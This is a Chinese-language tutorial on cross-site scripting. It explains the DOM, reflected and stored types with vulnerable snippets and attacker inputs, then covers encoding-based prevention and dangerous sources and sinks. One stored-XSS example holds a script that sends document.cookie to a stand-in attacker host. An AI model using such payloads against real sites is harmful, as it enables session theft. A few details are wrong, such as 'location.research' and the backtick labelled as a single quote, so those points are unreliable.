# XSS概述
  XSS的目标是让其他站点的js文件运行在目标站点的上，这主要发生在页面渲染阶段。在该阶段发生了某些非预期的脚本行为，该脚本可能来自用户的输入，也可能来自域外的其他js文件，不一而足。

  主要有两点：
  1.其他站点的js文件运行在目标站点上
  2.发生起源主要来自于用户输入

# XSS的类型：

XSS的发生起源来自于用户输入，因此根据用户输入数据以何种形式、何时触发XSS、是否有后端服务器的参与将其划分为三种类型:

1.DOM XSS:
2.反射型XSS:后端参与但不存储
3.存储型XSS:后端参与且存储

## DOM XSS:
1.一般形式:
  例：
  test.html:
     <script>
      eval('alert(location.hash.slice("1"))');
     </script>

  攻击者输入：
    localhost/test.html#document.cookie
 
## 反射型XSS：
1.一般形式：
  (1)形式一：
    test.html:
      <?php echo $_GET['name'] ?>
    攻击者输入:
      localhost/test.php?name=alert(document.cookie) 

  (2)形式二：
    test.html:
      <?php echo $_GET['name'] ?>
    攻击者输入:
      localhost/test.php?name=data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+

    注：name后面的编码字串解码后是“alert(document.cookie)”。

## 存储型XSS：
1.一般形式:
  例：
  test.html:
    <form method="post" action="/">
      <fieldset>
        <label>备注：</label><input type="text" value="" />
      </fieldset>
    </form>
  攻击者在备注输入框中输入如下内容，然后后台系统的使用人员的cookie信息将会被攻击者拿到：
    <script>document.getElementById('attacker').href='http://www.attacker_741.com/receiveCookies.html?'+document.cookie;</script>
    

# 总的预防措施:
  对输入(和URL参数)进行过滤，对输出进行编码

## 编码预防原理：
  将相关内容编码后，其只能作为字符串在页面中进行显示，而不能作为Html或js或url进行解析执行。

## 注意事项：
1.url编码时，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，进而导致不能正常解码，不能正常执行；
2.js编码时，对圆括号、双引号、单引号等等字符如果进行编码，解码时其仅会被解析为字符串文本或者标识符名称。
3.浏览器对Html、js和url的解析原理：
  (1)对于文档只含有html和url的情况：先html解析，然后url解析。
  (2)对于文档含有html和url以及js，且url内容为js的情况。先html解析，然后url解析,最后js解析。
  (3)对于文档含有html和url以及js，且js内容为url的情况。先html解析，然后js解析,最后url解析。
  
# 具体措施:
## 为了预防XSS，进行html编码时，需要编码的字符至少需要包含如下字符：
  1.< :即左尖括号；
  2.> :即右尖括号；
  3.` :即单引号；
  4." :即双引号；
  5.& :即与操作。

## 为了预防XSS，js可以进行转义和编码。
  1.转义：使用“\”对特殊字符进行转义后，字符将以字符串形式呈现，不会当做代码执行。
  2.编码：对圆括号、双引号、单引号等等字符如果进行编码，解码时其仅会被解析为字符串文本，不会被当做代码执行。

## 为了预防XSS，url编码。
  对url键值对中的值进行编码。

## 需要留意的输入源：
  1.document.URL；
  2.location.hash；
  3.location.research；
  4.document.referrer(此处应尤为注意，referrer属性虽然可用于避免CSRF，但可触发XSS攻击)；
  5.XHR返回值（跨域返回值）；
  6.form表单及各种input框。

## 需要留意的操作：

1.直接输出HTML内容
  document.body.innerHTML = ...
  document.body.outterHTML = ...
  document.write()

2.HTML标签内联脚本:
  <img src='abc' onerror=alert('error')>

3.直接执行脚本:
  eval
  new Function(){}
  setTimeout()
  window.execScript()

4.打开新页面触发XSS:
  window.open()
  location.href = ...
  location.hash = ...





